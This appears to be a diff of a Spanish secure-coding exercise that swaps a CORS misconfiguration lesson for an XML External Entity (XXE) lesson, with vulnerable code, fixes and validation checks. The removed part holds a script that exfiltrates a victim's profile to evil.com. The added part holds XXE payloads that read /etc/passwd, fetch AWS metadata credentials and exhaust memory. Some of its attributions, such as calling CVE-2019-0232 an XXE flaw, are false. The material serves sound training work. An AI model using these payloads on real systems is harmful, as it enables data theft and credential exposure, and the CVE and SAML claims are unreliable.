@@ -1,171 +1,193 @@
-# Paso 5 — CORS Misconfiguration
-**Tecnologia:** Python / FastAPI | **OWASP:** A05:2021 - Security Misconfiguration | **CWE-942**
+# Paso 6 — XXE (XML External Entity)
+**Tecnologia:** Java / Spring Boot | **OWASP:** A05:2021 - Security Misconfiguration | **CWE-611**
 
 ---
 
 ## Que es esta vulnerabilidad?
 
-Cross-Origin Resource Sharing (CORS) es el mecanismo por el que un servidor declara que origenes externos pueden leer sus respuestas desde un navegador. Una mala configuracion CORS no afecta a peticiones directas con curl o Postman; solo importa en el contexto del navegador, donde la politica Same-Origin normalmente bloquearia las peticiones cross-origin.
+XML External Entity (XXE) ocurre cuando un parser XML procesa documentos que incluyen referencias a entidades externas. La especificacion XML permite que un documento defina entidades que apuntan a URLs o archivos del sistema de archivos. Si el parser las procesa sin restricciones, el atacante puede leer archivos locales del servidor, realizar peticiones internas (SSRF) o incluso causar denegacion de servicio (Billion Laughs attack).
 
-La combinacion `allow_origins=["*"]` con `allow_credentials=True` es la configuracion mas peligrosa: indica al navegador que cualquier dominio puede hacer peticiones autenticadas (con cookies de sesion) y leer las respuestas. Un sitio malicioso puede aprovechar esto para extraer datos privados del usuario mientras este navega.
+El problema es que `DocumentBuilderFactory` en Java acepta DTDs y entidades externas por defecto. Esto era un comportamiento legitimo en 1998, pero en el contexto de APIs web modernas representa una superficie de ataque critica. El parser no tiene forma de saber si el XML viene de una fuente confiable o de un atacante.
 
-La especificacion CORS prohibe esta combinacion y los navegadores modernos la rechazan generando un error. Sin embargo, muchos desarrolladores "resuelven" el error reflejando el origen de la peticion sin validarlo, lo que es igualmente peligroso y mucho mas dificil de detectar.
+XXE fue la base de CVE-2019-0232 (Apache Tomcat CGI), CVE-2018-1000840 (varias librerias Java) y del famoso bypass de autenticacion SAML donde las firmas XML podian ser manipuladas para incluir entidades externas.
 
 ---
 
 ## Donde ocurre en este codigo?
 
-**Archivo:** `src/python/routes/cors.py`
+**Archivo:** `src/java/src/main/java/com/example/api/controller/XmlController.java`
 
-```python
-# CODIGO VULNERABLE — estado actual del ejercicio
-def configure_cors(app: FastAPI) -> None:
-    app.add_middleware(
-        CORSMiddleware,
-        allow_origins=["*"],     # cualquier origen puede hacer peticiones
-        allow_credentials=True,  # con cookies de sesion incluidas
-        allow_methods=["*"],
-        allow_headers=["*"],
-    )
+```java
+// CODIGO VULNERABLE — estado actual del ejercicio
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
+// Sin ninguna configuracion de seguridad: acepta DTDs y entidades externas por defecto
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xml)));
 ```
 
-Con esta configuracion, cuando `evil.com` hace una peticion a la API con credenciales, el servidor responde con `Access-Control-Allow-Origin: *` y `Access-Control-Allow-Credentials: true`. El navegador permite que el script de `evil.com` lea la respuesta completa, incluyendo datos privados del usuario autenticado.
+Con la configuracion por defecto, `DocumentBuilderFactory` procesa:
+- Declaraciones `DOCTYPE` y sus DTDs asociadas
+- Entidades generales externas (`SYSTEM` y `PUBLIC`)
+- Entidades de parametro externas
+- Includes via XInclude
+
+Todo ello puede apuntar a rutas del sistema de archivos local o URLs internas.
 
 ---
 
 ## Como lo explotaria un atacante
 
-**Escenario:** la victima esta autenticada en `api.empresa.com`. Un atacante la atrae a `evil.com`:
-
-```html
-<!-- Codigo en evil.com que roba datos de la API -->
-<script>
-fetch('https://api.empresa.com/api/user/profile', {
-    credentials: 'include'  // incluye las cookies de sesion de la victima
-})
-.then(r => r.json())
-.then(data => {
-    // el atacante recibe nombre, email, datos de pago de la victima
-    fetch('https://evil.com/collect?d=' + btoa(JSON.stringify(data)));
-});
-</script>
+**Lectura de archivos locales:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<request>
+  <name>&xxe;</name>
+</request>
 ```
+El servidor devuelve el contenido de `/etc/passwd` en el campo `name` de la respuesta.
 
-Con la configuracion vulnerable, el servidor responde con los datos y el navegador permite que `evil.com` los lea. El atacante recibe los datos privados sin que la victima lo note.
+**SSRF — acceso a servicios internos:**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+]>
+<request><data>&xxe;</data></request>
+```
+En entornos AWS, esta URL devuelve las credenciales IAM temporales de la instancia EC2.
+
+**Billion Laughs (DoS):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE bomb [
+  <!ENTITY a "12345678901234567890">
+  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+  <!ENTITY bomb "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+]>
+<data>&bomb;</data>
+```
+La expansion exponencial de entidades agota la memoria del servidor.
 
 ---
 
 ## Tu tarea: aplicar la mitigacion
 
-Modifica `src/python/routes/cors.py` para usar una lista explicita de origenes cargada desde variables de entorno:
+Modifica `XmlController.java` para deshabilitar completamente el procesamiento de entidades externas:
 
-```python
-# CODIGO SEGURO
-import os
-from fastapi import FastAPI
-from fastapi.middleware.cors import CORSMiddleware
+```java
+// CODIGO SEGURO
+DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
 
-ALLOWED_ORIGINS = [
-    origin.strip()
-    for origin in os.environ.get("CORS_ALLOWED_ORIGINS", "https://app.empresa.com").split(",")
-    if origin.strip()
-]
+// Deshabilitar DOCTYPE completamente (opcion mas segura)
+factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
 
-def configure_cors(app: FastAPI) -> None:
-    app.add_middleware(
-        CORSMiddleware,
-        allow_origins=ALLOWED_ORIGINS,             # lista explicita, no wildcard
-        allow_credentials=True,
-        allow_methods=["GET", "POST", "PUT", "DELETE"],
-        allow_headers=["Authorization", "Content-Type"],
-    )
+// Por si acaso: deshabilitar entidades externas generales y de parametro
+factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+
+// Deshabilitar carga de DTD externas y XInclude
+factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
+factory.setXIncludeAware(false);
+factory.setExpandEntityReferences(false);
+
+DocumentBuilder builder = factory.newDocumentBuilder();
+Document doc = builder.parse(new InputSource(new StringReader(xml)));
 ```
 
 ### Por que funciona esta mitigacion?
 
-- **Lista explicita de origenes:** el middleware verifica que el encabezado `Origin` de la peticion coincide con uno de los origenes permitidos. Si `evil.com` no esta en la lista, el servidor no incluye `Access-Control-Allow-Origin` y el navegador bloquea la lectura de la respuesta.
-- **Variables de entorno:** los origenes permitidos cambian entre entornos. Cargarlos desde entorno evita hardcodear URLs y permite gestion correcta en CI/CD.
-- **`allow_methods` y `allow_headers` explicitos:** en lugar de `["*"]`, reduce la superficie especificando exactamente que metodos y headers son necesarios para la aplicacion.
+- **`disallow-doctype-decl`:** rechaza cualquier documento que contenga una declaracion `DOCTYPE`. Es la proteccion mas contundente: si no hay DOCTYPE, no puede haber entidades externas. Lanza `SAXParseException` al encontrar `<!DOCTYPE`.
+- **`external-general-entities: false`:** impide que el parser resuelva entidades `SYSTEM` o `PUBLIC` que apunten a recursos externos.
+- **`external-parameter-entities: false`:** impide entidades de parametro externas (`<!ENTITY % name SYSTEM "url">`).
+- **`setXIncludeAware(false)`:** deshabilita XInclude, otro vector para incluir archivos externos en XML.
 
 ---
 
-## Variantes de la misma categoria (Security Misconfiguration — mas complejas)
+## Variantes de la misma categoria (Security Misconfiguration en parsers — mas complejas)
 
-### Variante A: Origin Reflection sin validacion (wildcard dinamico)
+### Variante A: XXE en carga de SVG
 
-Una solucion incorrecta al error de `*` + `credentials` es reflejar automaticamente el origen de la peticion:
+Los archivos SVG son XML. Si la aplicacion acepta uploads de SVG y los parsea o los renderiza en el servidor:
 
 ```python
-# VULNERABLE — refleja el Origin sin validar (equivale a allow_origins=["*"])
-@app.middleware("http")
-async def cors_middleware(request: Request, call_next):
-    response = await call_next(request)
-    origin = request.headers.get("Origin", "")
-    # reflejo sin validar: cualquier origen recibira su nombre como permitido
-    response.headers["Access-Control-Allow-Origin"] = origin
-    response.headers["Access-Control-Allow-Credentials"] = "true"
-    return response
+# VULNERABLE — el SVG es XML y puede contener entidades externas
+from lxml import etree
+
+@router.post("/render-svg")
+async def render_svg(file: UploadFile):
+    content = await file.read()
+    tree = etree.parse(io.BytesIO(content))  # lxml procesa entidades por defecto
+    return {"elements": len(tree.getroot())}
 ```
 
-Este patron es funcionalmente equivalente a `allow_origins=["*"]` + `credentials=True` pero pasa desapercibido en revisiones de codigo.
+Payload SVG:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&xxe;</text>
+</svg>
+```
 
 ```python
-# SEGURO — reflejar solo si el origen esta en la allowlist
-ALLOWED_ORIGINS = set(os.environ.get("CORS_ALLOWED_ORIGINS", "").split(","))
-
-@app.middleware("http")
-async def cors_middleware(request: Request, call_next):
-    response = await call_next(request)
-    origin = request.headers.get("Origin", "")
-    if origin in ALLOWED_ORIGINS:
-        response.headers["Access-Control-Allow-Origin"] = origin
-        response.headers["Access-Control-Allow-Credentials"] = "true"
-    return response
+# SEGURO — lxml con resolve_entities=False
+parser = etree.XMLParser(resolve_entities=False, no_network=True, load_dtd=False)
+tree = etree.parse(io.BytesIO(content), parser)
 ```
 
 ---
 
-### Variante B: Validacion CORS por sufijo — bypass por subdominio
+### Variante B: XXE en importacion de Excel/LibreOffice (OOXML)
 
-```python
-# VULNERABLE — validacion por sufijo permite bypass
-def is_allowed_origin(origin: str) -> bool:
-    return origin.endswith(".empresa.com")  # solo comprueba sufijo
+Los archivos `.xlsx`, `.docx` y `.odt` son ZIPs de XML. Algunos parsers de Office procesan entidades externas en los XML internos:
+
+```java
+// VULNERABLE — Apache POI con configuracion por defecto en versiones antiguas
+Workbook wb = WorkbookFactory.create(inputStream);
 ```
 
-Bypass: el atacante registra `evil.empresa.com` (si el DNS lo permite) o `evilempresa.com` que tambien termina en `empresa.com` si no se ancla el punto. Tambien `https://evil.com?x=.empresa.com` puede pasar si la validacion no es rigurosa.
+Un archivo `.xlsx` malicioso puede contener en `xl/sharedStrings.xml`:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<sst><si><t>&xxe;</t></si></sst>
+```
 
-```python
-# SEGURO — comparacion exacta contra allowlist normalizada
-ALLOWED_ORIGINS = {
-    "https://app.empresa.com",
-    "https://admin.empresa.com",
+```java
+// SEGURO — usar version actualizada de Apache POI (>= 5.2.0) y verificar el tipo antes
+if (!isValidExcelFile(inputStream)) {
+    throw new SecurityException("Formato de archivo no permitido");
 }
-
-def is_allowed_origin(origin: str) -> bool:
-    return origin in ALLOWED_ORIGINS  # comparacion exacta de string completo
+// Apache POI >= 5.2.0 tiene proteccion XXE por defecto
+Workbook wb = WorkbookFactory.create(inputStream);
 ```
 
 ---
 
-### Variante C: CORS con origen `null` (iframes sandboxed)
+### Variante C: XXE en SAML Authentication Bypass
 
-```python
-# VULNERABLE — aceptar null como origen valido
-ALLOWED_ORIGINS = ["https://app.empresa.com", "null"]
+```java
+// VULNERABLE — parser SAML sin proteccion XXE
+// Un atacante puede modificar la firma XML de un SAML assertion
+// e inyectar entidades externas para exfiltrar datos o bypassear la firma
+SAMLResponse response = samlParser.parse(xmlString);  // parser sin hardening
+if (response.isValid()) {
+    // autenticar usuario
+}
 ```
 
-El origen `null` lo envian los navegadores cuando la peticion viene de un archivo local (`file://`), un iframe sandboxed (`<iframe sandbox>`) o ciertos redirects. Un atacante puede forzar `Origin: null` usando:
+En ataques reales de bypass SAML, la entidad externa en un campo firmado puede hacer que la firma verifique sobre un valor diferente al que el servidor procesa. Esto fue explotado en Google Workspace, GitHub Enterprise y otros proveedores SSO.
 
-```html
-<iframe sandbox="allow-scripts" src="data:text/html,<script>fetch('https://api.empresa.com/data',{credentials:'include'}).then(r=>r.json()).then(d=>parent.postMessage(d,'*'))</script>">
-</iframe>
-```
-
-```python
-# SEGURO — nunca incluir null en la allowlist
-ALLOWED_ORIGINS = ["https://app.empresa.com"]
-# null no es un origen legitimo para APIs web
+```java
+// SEGURO — usar libreria SAML con XXE protection documentada
+// OpenSAML >= 3.x o Spring Security SAML con SAMLBootstrap
+SAMLBootstrap.bootstrap();  // configura parsers seguros para todos los contextos SAML
 ```
 
 ---
@@ -173,15 +195,15 @@ ALLOWED_ORIGINS = ["https://app.empresa.com"]
 ## Referencias
 
 - [OWASP A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
-- [CWE-942: Permissive Cross-domain Policy](https://cwe.mitre.org/data/definitions/942.html)
-- [PortSwigger - CORS misconfiguration](https://portswigger.net/web-security/cors)
-- [Mozilla MDN - CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
+- [CWE-611: XXE](https://cwe.mitre.org/data/definitions/611.html)
+- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
+- [PortSwigger - XML external entity injection](https://portswigger.net/web-security/xxe)
 
 ---
 
 ## Lo que valida el workflow automaticamente
 
-El workflow **Validate Step 05** exige que `src/python/routes/cors.py` contenga:
-- `ALLOWED_ORIGINS`
-- `os.environ.get`
-- La ausencia de `allow_origins=["*"]`
+El workflow **Validate Step 06** exige que `XmlController.java` contenga:
+- `disallow-doctype-decl`
+- `external-general-entities`
+- `setXIncludeAware(false)`
